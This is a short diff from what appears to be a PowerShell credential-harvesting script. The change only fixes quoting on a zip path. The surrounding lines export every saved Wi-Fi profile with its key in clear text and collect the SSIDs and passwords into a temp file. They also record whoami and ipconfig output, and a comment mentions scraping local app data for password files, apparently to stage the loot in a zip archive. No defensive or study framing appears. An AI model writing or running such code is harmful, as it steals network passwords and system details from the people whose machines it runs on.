@@ -4,7 +4,7 @@ cmd.exe /c "D: && cd D:\Scripts && py fun.py" # instead of downloading something
 $e="$env:LOCALAPPDATA\Temp"; netsh wlan export profile key=clear folder=$e | Out-Null; Get-ChildItem "$e\Wi-Fi*.xml" | %{$x=[xml](gc $_); "SSID:$($x.WLANProfile.SSIDConfig.SSID.name) | Password:$($x.WLANProfile.MSM.security.sharedKey.keyMaterial)"} > "$e\wifi.txt"
 
 #scrape the localappdata for password files
-$zip=$env:TEMP\funny_stuff_folder.zip
+$zip="$env:TEMP\funny_stuff_folder.zip"
 $whoami_content = whoami
 
 ipconfig /all | Out-File -FilePath "$e\ipcfg.txt" # save ipconfig as a file
